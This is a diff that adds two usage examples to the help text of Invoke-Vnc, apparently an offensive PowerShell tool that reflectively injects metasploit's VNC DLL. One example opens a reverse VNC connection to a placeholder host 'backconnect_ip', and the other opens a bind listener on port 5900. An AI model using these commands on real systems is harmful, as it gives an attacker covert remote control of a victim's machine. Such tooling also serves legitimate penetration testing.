@@ -33,7 +33,11 @@ Optional, an array of computernames to run the script on.
 	
 .EXAMPLE
 
+Invoke-Vnc -ConType reverse -IpAddress backconnect_ip -Port 5500 -Password P@ssw0rd
 
+.EXAMPLE
+
+Invoke-Vnc -ConType bind -Port 5900 -Password P@ssw0rd
 
 .NOTES
 This script was created by combining the Invoke-ReflectivePEInjection script written by Joe Bialek and the vncdll code from rapid7 metasploit repository
